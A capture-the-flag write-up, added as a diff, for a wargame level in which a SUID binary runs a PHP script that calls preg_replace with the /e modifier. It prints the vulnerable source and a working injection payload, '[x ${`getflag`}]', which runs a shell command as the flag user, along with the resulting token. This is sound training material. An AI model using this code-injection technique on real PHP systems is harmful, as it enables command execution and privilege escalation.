@@ -1,0 +1,30 @@
+In the level06, we found 2 file this time, an executable "level06" with s(SUID) permission and "level06.php". Both file owner is flag06.
+
+"./level06" result: "PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4"
+
+"level06" is an executable which will call the "level06.php" which in turn expecting that we give it a file to read.
+
+"cat level06.php"
+
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+The vulnerability happens on this line "$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)".
+"/e" modifier in php preg_replace allows the execution of the php code defined in the replacement variable of the function.
+"y()" is a function that was defined above, and "\2" means the 2nd capturing group of the regex pattern.
+
+Base on the rule of the regex pattern, we can provided a string that align to this rule, and get our 2nd capturing group to be print out at the end of that php file.
+We will create a file contains this string `[x ${`getflag`}]`, the 2nd capturing group will get the "${`getflag`}" out from the initial string.
+
+In php, "${`a`}" is the same as "$a" which means the variable a, and php echo works the same as the normal shell command echo as well.
+So potentially, if we purposely cause an error on undefined variable, php will try to let us know which variable are the one that is reponsible by echo it.
+
+"echo '[x ${`getflag`}]' > /tmp/exploit"
+"./level06 /tmp/exploit"
+
+"PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1"
